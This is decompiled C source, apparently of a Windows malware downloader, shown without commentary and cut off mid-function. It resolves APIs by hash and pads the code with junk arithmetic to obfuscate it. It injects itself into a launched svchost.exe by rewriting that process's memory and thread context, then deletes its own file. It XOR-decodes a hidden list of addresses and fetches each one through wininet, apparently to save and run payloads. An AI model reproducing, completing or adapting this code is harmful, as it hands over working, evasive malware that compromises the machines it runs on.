/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __stdcall sub_401000(int a1, int a2, int a3, int a4);
void __noreturn sub_401471(); // weak
int sub_401735();
int __stdcall sub_401B5A(LPCSTR lpString); // idb
int __stdcall sub_401FB5(int a1, int a2);
void __noreturn start(); // weak
int __cdecl sub_402248(int a1, int a2, int a3);
void __cdecl sub_402390(void *a1);
int __cdecl sub_4023C0(int a1, int a2, int a3, _DWORD *a4);
// int __usercall sub_4023F0@<eax>(int a1@<ebp>, int a2, unsigned int a3);
// int __userpurge sub_4024B9@<eax>(int result@<eax>, int a2@<ebp>, int a3);
BOOL sub_4024E0();
LPVOID __cdecl sub_402530(SIZE_T dwBytes);
BOOL __cdecl sub_402570(LPVOID lpMem);
void __cdecl __noreturn sub_4025D0(UINT uExitCode); // idb
int sub_4025E0();
void sub_402650();
UINT __ioinit();
_DWORD *__cdecl sub_4028F0(char *a1, char **a2, char *a3, _DWORD *a4, _DWORD *a5);
int sub_402A80();
char *sub_402B20();
LPSTR sub_402BE0();
void __cdecl __noreturn sub_402C20(UINT uExitCode); // idb
LONG __cdecl sub_402C80(int a1, struct _EXCEPTION_POINTERS *ExceptionInfo);
int __cdecl sub_402CF0(int a1);
int __stdcall sub_402D00(__int64 a1, unsigned __int64 a2);
int __cdecl grabhunk(int a1);
int __cdecl _sheap_alloc(int a1);
LPVOID __cdecl sub_4032C0(SIZE_T dwBytes);
unsigned int __cdecl _sheap_free(unsigned int a1);
int __cdecl sub_403620(LPVOID lpMem); // idb
BOOL __stdcall HandlerRoutine(DWORD CtrlType); // idb
int __cdecl sub_4036A0(int a1, int a2);
const void *__cdecl sub_403700(SIZE_T dwSize);
// void __stdcall RtlUnwind(PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// BOOL __stdcall FreeConsole();
// LPSTR __stdcall GetCommandLineA();
// BOOL __stdcall DeleteFileA(LPCSTR lpFileName);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// LPSTR __stdcall lstrcpyA(LPSTR lpString1, LPCSTR lpString2);
// LPSTR __stdcall lstrcatA(LPSTR lpString1, LPCSTR lpString2);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// int __stdcall lstrlenA(LPCSTR lpString);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// void __stdcall Sleep(DWORD dwMilliseconds);
// void __stdcall GetStartupInfoA(LPSTARTUPINFOA lpStartupInfo);
// HANDLE __stdcall HeapCreate(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize);
// LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// BOOL __stdcall HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// void __stdcall GetSystemTimeAsFileTime(LPFILETIME lpSystemTimeAsFileTime);
// DWORD __stdcall GetFileType(HANDLE hFile);
// HANDLE __stdcall GetStdHandle(DWORD nStdHandle);
// HANDLE __stdcall GetCurrentProcess();
// BOOL __stdcall DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
// UINT __stdcall SetHandleCount(UINT uNumber);
// LPCH __stdcall GetEnvironmentStrings();
// BOOL __stdcall FreeEnvironmentStringsA(LPCH penv);
// LONG __stdcall UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo);
// BOOL __stdcall SetConsoleCtrlHandler(PHANDLER_ROUTINE HandlerRoutine, BOOL Add);
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// SIZE_T __stdcall VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
// HRESULT __stdcall StgCreateStorageEx(const WCHAR *pwcsName, DWORD grfMode, DWORD stgfmt, DWORD grfAttrs, STGOPTIONS *pStgOptions, PSECURITY_DESCRIPTOR pSecurityDescriptor, const IID *const riid, void **ppObjectOpen);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_4023AC; // weak
_UNKNOWN unk_404088; // weak
_DWORD dword_4040D8 = 16384; // idb
void (*dword_4040DC[969])(void) =
{
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  
}; // idb
char byte_405000[8] = { '¶', 'ý', '¸', 'L', 'a', '¿', '&', 'ò' }; // idb
void *off_405008 = &unk_40403E; // weak
_DWORD dword_40500C[4] = { 429065504, 0, 0, 0 }; // idb
int dword_40501C = 0; // weak
int dword_405020 = 0; // weak
int dword_405028 = 0; // weak
LPCVOID lpAddress = NULL; // idb
SIZE_T dwSize = 0u; // idb
int dword_405038 = 1024; // weak
_DWORD dword_40503C[44] =
{
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // idb
int dword_4050EC = 0; // weak
void *off_4050F0 = &unk_404084; // weak
int funcs_402C3C[80] =
{
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // idb
int dword_405234 = 80; // weak
int dword_405238 = 0; // weak
int dword_40523C[9] = { 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // idb
int dword_405260 = 0; // weak
int dword_405264 = 0; // weak
int dword_405268 = 0; // weak
int dword_40526C = 8; // weak
int dword_405270 = 16; // weak
int dword_405274 = 32; // weak
int dword_405278 = 64; // weak
int dword_40527C = 128; // weak
int dword_405280 = 256; // weak
int dword_405284 = 512; // weak
int dword_40528C = 0; // weak
int dword_405290 = 0; // weak
char byte_405294 = '\0'; // weak
int dword_405298 = 0; // weak
HANDLE hHeap = NULL; // idb
struct _FILETIME SystemTimeAsFileTime = { 0u, 0u }; // idb
int dword_405680 = 0; // weak
int dword_405684 = 0; // weak
int (__stdcall *dword_405688)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_40568C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_405690)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_405694)(_DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_405698)(_DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_40569C)(_DWORD) = NULL; // weak
int (__stdcall *dword_4056A0)(_DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_4056A4)(_DWORD) = NULL; // weak
int (__stdcall *dword_4056A8)(_DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_4056AC)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_4056B0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_4056B4)(_DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_4056B8)(_DWORD) = NULL; // weak
int (__stdcall *dword_4056BC)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
CHAR String[1024] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  
}; // idb
CHAR Filename[260]; // idb
CHAR FileName[260]; // idb
int dword_405CC8; // weak
int dword_405CF4; // weak
__int16 word_405CF8; // weak
_UNKNOWN dword_405D0C; // weak
_UNKNOWN dword_405D10; // weak
int dword_405D1C; // weak
int dword_405DD4; // weak
int dword_405FE8[64]; // idb
UINT uNumber; // idb


//----- (00401000) --------------------------------------------------------
int __stdcall sub_401000(int a1, int a2, int a3, int a4)
{
  HMODULE v4; // ebx
  int v5; // eax
  bool v6; // cc
  int i; // eax
  int j; // eax
  int k; // eax
  int v10; // eax
  int l; // eax
  int m; // eax
  int v13; // ebx
  int v14; // eax
  int v15; // eax
  int v16; // eax
  int n; // eax
  int ii; // eax
  int v19; // eax
  int v20; // ebx
  int v21; // eax
  int jj; // eax
  int v24; // [esp+24h] [ebp-Ch]
  unsigned int v25; // [esp+24h] [ebp-Ch]
  int v26; // [esp+24h] [ebp-Ch]
  char v27; // [esp+24h] [ebp-Ch]
  int v28; // [esp+28h] [ebp-8h]
  int v29; // [esp+28h] [ebp-8h]
  char v30; // [esp+2Ch] [ebp-4h]
  int v31; // [esp+2Ch] [ebp-4h]
  int v32; // [esp+2Ch] [ebp-4h]
  int v33; // [esp+2Ch] [ebp-4h]

  v4 = LoadLibraryA("kernel32.dll");
  v5 = 8;
  do
  {
    v28 = (v24 - (v24 + 7290) * 2 * v24 + 8108) | ((2 * v28 + 84) << (2 * v28 + 4 * v30) << (v24
                                                                                           + (v24 - 32) * (2 * v28 - 75)
                                                                                           - 122));
    v6 = v5 < 4;
    v5 -= 4;
  }
  while ( !v6 );
  dword_405688 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_401FB5((int)v4, -686567859);
  v25 = (unsigned int)(2 * v24 + 8 * v28) >> (v30 + 66) << (2 * v24) >> (4 * v28);
  dword_40568C = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_401FB5((int)v4, 194903084);
  for ( i = 0; i <= 6; i += 4 )
    LOBYTE(v31) = 0;
  dword_405690 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_401FB5((int)v4, 451423767);
  for ( j = 0; j <= 3; j += 2 )
    v31 = ((v25 + 5728) << (v28 - 119) << (2 * v25 - 81)) & ((v28 + 7515) << (2 * v28)) & ((v28 + 4657) << (2 * v31)) & (4 * v28 + 3285);
  dword_405694 = (int (__stdcall *)(_DWORD, _DWORD))sub_401FB5((int)v4, 994013453);
  v29 = (2 * v31 + 77) | (8 * v28) ^ (2 * v28 + 238);
  dword_405698 = (int (__stdcall *)(_DWORD, _DWORD))sub_401FB5((int)v4, 994007309);
  for ( k = 0; k <= 10; k += 2 )
    v32 = 2 * v25 + 114;
  dword_40569C = (int (__stdcall *)(_DWORD))sub_401FB5((int)v4, -1140130894);
  v10 = 7;
  do
  {
    v25 = (2 * v25) ^ (2 * v25 + 8 * v32) ^ (2 * v29 + 161) ^ (8 * v29 + 8429) | ((4 * v25 + 833) >> (4 * v32 + 74));
    v6 = v10 < 2;
    v10 -= 2;
  }
  while ( !v6 );
  dword_4056A0 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))sub_401FB5((int)v4, 387765065);
  for ( l = 0; l <= 8; l += 3 )
    v29 = (2 * v29 + 36) & (8 * v32 + 9862) & (4 * v25 + 3388);
  dword_4056A4 = (int (__stdcall *)(_DWORD))sub_401FB5((int)v4, 254723247);
  for ( m = 0; m <= 10; m += 2 )
    ;
  v13 = dword_4056A4("wininet.dll");
  v14 = 3;
  do
  {
    v33 = (2 * v25 + 4254) & ((v29 + 3054) * 2 * v29);
    v6 = v14 < 3;
    v14 -= 3;
  }
  while ( !v6 );
  dword_4056A8 = (int (__stdcall *)(_DWORD, _DWORD))sub_401FB5(v13, -436547703);
  v15 = 5;
  do
  {
    v26 = 0;
    v6 = v15 < 5;
    v15 -= 5;
  }
  while ( !v6 );
  dword_4056AC = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_401FB5(v13, -914654882);
  v16 = 3;
  do
  {
    v26 = (2 * v26) & ((2 * v33) << (2 * v33));
    v6 = v16 < 4;
    v16 -= 4;
  }
  while ( !v6 );
  dword_4056B0 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_401FB5(v13, 694103108);
  for ( n = 0; n <= 6; n += 4 )
    v29 = ((v29 + 171) << (8 * v26 - 56)) ^ (2 * v33 + 24) & (4 * v29 + 7359) | ((v29 + 5372) * (8 * v29 + 1212));
  dword_4056B4 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_401FB5(v13, -1962690496);
  for ( ii = 0; ii <= 10; ii += 4 )
    ;
  dword_4056B8 = (int (__stdcall *)(_DWORD))sub_401FB5(v13, 1465674292);
  v19 = 8;
  do
  {
    v27 = 2 * v29;
    v6 = v19 < 4;
    v19 -= 4;
  }
  while ( !v6 );
  v20 = dword_4056A4("shell32.dll");
  v21 = 4;
  do
  {
    v29 = ((v29 + 2 * v33 + 2593) << (2 * v27 + 78)) | ((2 * v29 - 2 * v33 - v33 - 2985) << (2 * v29 + 75));
    v6 = v21 < 2;
    v21 -= 2;
  }
  while ( !v6 );
  dword_4056BC = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_401FB5(v20, -1775662064);
  for ( jj = 0; jj <= 9; jj += 4 )
    ;
  sub_401735();
  return 0;
}
// 401058: variable 'v24' is possibly undefined
// 40101E: variable 'v28' is possibly undefined
// 401029: variable 'v30' is possibly undefined
// 405688: using guessed type int (__stdcall *dword_405688)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 40568C: using guessed type int (__stdcall *dword_40568C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 405690: using guessed type int (__stdcall *dword_405690)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 405694: using guessed type int (__stdcall *dword_405694)(_DWORD, _DWORD);
// 405698: using guessed type int (__stdcall *dword_405698)(_DWORD, _DWORD);
// 40569C: using guessed type int (__stdcall *dword_40569C)(_DWORD);
// 4056A0: using guessed type int (__stdcall *dword_4056A0)(_DWORD, _DWORD, _DWORD);
// 4056A4: using guessed type int (__stdcall *dword_4056A4)(_DWORD);
// 4056A8: using guessed type int (__stdcall *dword_4056A8)(_DWORD, _DWORD);
// 4056AC: using guessed type int (__stdcall *dword_4056AC)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4056B0: using guessed type int (__stdcall *dword_4056B0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4056B4: using guessed type int (__stdcall *dword_4056B4)(_DWORD, _DWORD, _DWORD, _DWORD);
// 4056B8: using guessed type int (__stdcall *dword_4056B8)(_DWORD);
// 4056BC: using guessed type int (__stdcall *dword_4056BC)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00401471) --------------------------------------------------------
void __noreturn sub_401471()
{
  int v0; // eax
  bool v1; // cc
  LPSTR v2; // ebx
  const CHAR *v3; // ebx
  BOOL i; // esi
  int j; // eax
  int v6; // ebx
  int v7; // esi
  int v8; // edi
  int k; // eax
  unsigned int v10; // edx
  int v11; // [esp+2Ch] [ebp-10h] BYREF
  unsigned int v12; // [esp+30h] [ebp-Ch]
  unsigned int v13; // [esp+34h] [ebp-8h]
  unsigned int v14; // [esp+38h] [ebp-4h]

  dword_4056A4("wininet.dll");
  v0 = 1;
  do
  {
    v13 = (((4 * v12 + 8392) * (v14 + 9352)) << ((2 * v13 + 124) * 2 * v12)) ^ (4 * v12 + 5661) | (4 * v13 + 9953);
    v1 = v0 < 3;
    v0 -= 3;
  }
  while ( !v1 );
  dword_4056A4("shell32.dll");
  v13 = (2 * v12 + 4192) << (2 * v12 + 4 * v13 - 15) >> (v13 - v14 - 4 * v13 + 4 * v12 + 59) >> (2 * v13);
  FreeConsole();
  v13 = (2 * v12 * 2 * v12 - 4 * v13) << (4 * v13 - 7) << (2 * v12 - (4 * v13 + 41)) << (2 * v12 + 8 * v13 - 60);
  v2 = GetCommandLineA();
  v13 = (4 * v14) | (4 * v12) & (v12 + 2 * v13 + 8816) & (v13 + 6824);
  while ( *v2 != 32 )
    ++v2;
  v3 = v2 + 1;
  for ( i = 0; !i; i = DeleteFileA(v3) )
    v13 = (2 * v14 + 10) << (v12 - 114);
  v14 *= 2;
  v11 = 7;
  if ( dword_4056A8(&v11, 0) )
  {
    for ( j = 0; j <= 10; j += 5 )
      v14 = 2 * v14 + 7193;
    v6 = 0;
    v7 = 0;
    v8 = 0;
    do
    {
      if ( v8 == 8 )
        v8 = 0;
      String[v7] = byte_405000[v8] ^ *((_BYTE *)off_405008 + v6);
      v14 = (8 * v12 + 7344) & ((8 * v13 + 5090) * (2 * v12 + 3258)) & (2 * v12 + 2 * v12 - 2 * v13 - v13 - 7414);
      if ( String[v7] == 44 )
      {
        v14 = (4 * v14) ^ (2 * v12) & ((2 * v12 + 217) >> (2 * v14 + 82)) | (v14 + 3299);
        String[v7] = 0;
        v14 = (10 * v12) & (v12 + 3693) & (8 * v14 - 2 * v14 * (2 * v12 + 7613) + 7091);
        sub_401B5A(String);
        v7 = -1;
      }
      ++v8;
      ++v7;
      ++v6;
    }
    while ( v6 < 57 );
  }
  for ( k = 5; k >= 0; --k )
  {
    v10 = (v13 + 2924) >> (2 * v14);
    v12 = v10;
  }
  ++v14;
  --v13;
  v12 = v10;
  ExitProcess(0);
}
// 401471: using guessed type void __noreturn sub_401471();
// 405008: using guessed type void *off_405008;
// 4056A4: using guessed type int (__stdcall *dword_4056A4)(_DWORD);
// 4056A8: using guessed type int (__stdcall *dword_4056A8)(_DWORD, _DWORD);

//----- (00401735) --------------------------------------------------------
int sub_401735()
{
  int v0; // eax
  bool v1; // cc
  int v2; // eax
  HMODULE v3; // ebx
  int i; // eax
  char *v5; // esi
  int v6; // eax
  int k; // edx
  int l; // eax
  int v9; // eax
  int j; // [esp+18h] [ebp-34h]
  char v12[4]; // [esp+3Ch] [ebp-10h] BYREF
  unsigned int v13; // [esp+40h] [ebp-Ch]
  unsigned int v14; // [esp+44h] [ebp-8h]
  unsigned int v15; // [esp+48h] [ebp-4h]

  GetModuleFileNameA(0, Filename, 0x104u);
  v0 = 10;
  do
  {
    v14 = 2 * v15 + 211;
    v1 = v0 < 5;
    v0 -= 5;
  }
  while ( !v1 );
  lstrcpyA(FileName, "svchost.exe ");
  v13 = (2 * v13) | ((4 * v15) << (8 * (v15 + v14) + 20) >> (8 * v14 + 79) >> (2 * v15 + 4 * 2 * v14 * v15));
  lstrcatA(FileName, Filename);
  v2 = 1;
  do
  {
    v14 = (8 * v14 + 4 * v13) << (8 * v14) << (2 * v14) >> (2 * v13 - 2 * v15 + 43) << (2 * v15 - 4 * v14);
    v1 = v2 < 3;
    v2 -= 3;
  }
  while ( !v1 );
  dword_405CC8 = 68;
  v13 = (2 * v14) ^ (2 * v14) ^ (4 * v15 + 90) ^ (4 * v13) & (-3601 - 4 * v13) & ((2 * v14 + 80) >> (4 * v14 + 36));
  dword_405CF4 = 1;
  word_405CF8 = 2;
  v14 = 4 * ((v14 + 5219) << (2 * v15));
  v3 = GetModuleHandleA(0);
  v13 = (2 * v15 + 8 * v13 - v13 + 3551) | (v14 + 3245) | ((8 * v15) >> (2 * v15
                                                                       + (v15 + 44) * (2 * v15 - 119)
                                                                       + 4 * v13 * (v15 + 9)));
  for ( i = 1; i >= 0; --i )
    v14 = (4 * v14 + 168) ^ (4 * v15) & (8 * v15 + 5561) | (2 * v13 + 5858) & ((2 * v14) << (v13 + 82));
  v5 = (char *)v3 + *((_DWORD *)v3 + 15);
  v14 = 2 * v15;
  dword_405688(0, FileName, 0, 0, 0, 4, 0, 0, &dword_405CC8, &dword_405D0C);
  v15 = (4 * v13 + 1882) | (8 * v15 + 5628) ^ ((4 * v13) >> (2 * v13 - 107));
  v6 = dword_40568C(dword_405D0C, v3, *((_DWORD *)v5 + 20), 12288, 64);
  for ( j = 0; j <= 4; j += 2 )
    v14 = (4 * v13) | ((8 * v14) >> (2 * v15)) & (2 * v13) & ((2 * v15 + 35) << (2 * v14 + 2 * v14 + v13 - 43));
  for ( k = 0; k <= 5; k += 2 )
    v15 = (2 * v15 * (2 * v13 + 93)) << (8 * v15);
  dword_405690(dword_405D0C, v6, v3, *((_DWORD *)v5 + 20), v12);
  for ( l = 0; l <= 2; l += 5 )
    v13 = ((2 * v13 + 8 * v14 + 1832) >> (2 * v14 + 9)) ^ ((v13 + 2263) >> (2 * v13)) & ((2 * v15 + 11) >> (2 * v15 - 94) >> (4 * v14 - 127));
  dword_405D1C = 65543;
  v14 = (v13 + 2 * v15 - 4 * v14 + 1804) >> (2 * v14 + 11);
  dword_405694(dword_405D10, &dword_405D1C);
  v15 = (2 * v15) & (v13 + 4 * v14 + 4586) & (2 * v15);
  dword_405DD4 = (int)sub_401471;
  v9 = 6;
  do
  {
    v13 = ((2 * v13) >> (2 * v13)) | ((2 * v15 + 219) * 2 * v15 + 8 * (v13 + v14) + 6904) ^ (v13 + 3320);
    v1 = v9 < 2;
    v9 -= 2;
  }
  while ( !v1 );
  dword_405698(dword_405D10, &dword_405D1C);
  v15 *= 2;
  return dword_40569C(dword_405D10);
}
// 401471: using guessed type void __noreturn sub_401471();
// 405688: using guessed type int (__stdcall *dword_405688)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 40568C: using guessed type int (__stdcall *dword_40568C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 405690: using guessed type int (__stdcall *dword_405690)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 405694: using guessed type int (__stdcall *dword_405694)(_DWORD, _DWORD);
// 405698: using guessed type int (__stdcall *dword_405698)(_DWORD, _DWORD);
// 40569C: using guessed type int (__stdcall *dword_40569C)(_DWORD);
// 405CC8: using guessed type int dword_405CC8;
// 405CF4: using guessed type int dword_405CF4;
// 405CF8: using guessed type __int16 word_405CF8;
// 405D0C: using guessed type int dword_405D0C;
// 405D10: using guessed type int dword_405D10;
// 405D1C: using guessed type int dword_405D1C;
// 405DD4: using guessed type int dword_405DD4;

//----- (00401B5A) --------------------------------------------------------
int __stdcall sub_401B5A(LPCSTR lpString)
{
  int v1; // esi
  int v2; // edi
  int v3; // eax
  bool v4; // cc
  int j; // eax
  int k; // eax
  HANDLE v7; // ebx
  int l; // eax
  int n; // eax
  int ii; // eax
  int v11; // eax
  int m; // [esp+14h] [ebp-458h]
  int v14; // [esp+18h] [ebp-454h]
  int v15; // [esp+1Ch] [ebp-450h]
  const CHAR *lpString2; // [esp+44h] [ebp-428h]
  int i; // [esp+48h] [ebp-424h]
  char Buffer[1024]; // [esp+58h] [ebp-414h] BYREF
  DWORD NumberOfBytesWritten; // [esp+458h] [ebp-14h] BYREF
  DWORD nNumberOfBytesToWrite; // [esp+45Ch] [ebp-10h] BYREF
  unsigned int v21; // [esp+460h] [ebp-Ch]
  unsigned int v22; // [esp+464h] [ebp-8h]
  unsigned int v23; // [esp+468h] [ebp-4h]

  v21 = (4 * v22 * 2 * v23) >> (2 * v21 * (v22 - 42));
  v1 = dword_4056AC(0, 0, 0, 0, 0);
  for ( i = 0; i <= 9; i += 5 )
    v23 = ((2 * v22 - v23 - 3773) << (8 * v21 + 17)) | (4 * v22 - (v21 + 3592)) ^ (4 * v21) & ((v21 + 5562) << (4 * v22 + 66));
  v2 = dword_4056B0(v1, lpString, 0, 0, 0x80000000, 0);
  if ( v2 )
  {
    v3 = 7;
    do
    {
      v23 = (2 * v21 + 53) | (2 * v23 + 143) | (v21 + 6665) | ((2 * v21 + 8) << (v23 + 91));
      v4 = v3 < 5;
      v3 -= 5;
    }
    while ( !v4 );
    for ( j = lstrlenA(lpString); j > 0; --j )
    {
      v22 = (2 * v22) & 0xFFFFED84 | (2 * v21 + 201);
      if ( lpString[j] == 47 )
      {
        lpString2 = &lpString[j + 1];
        break;
      }
    }
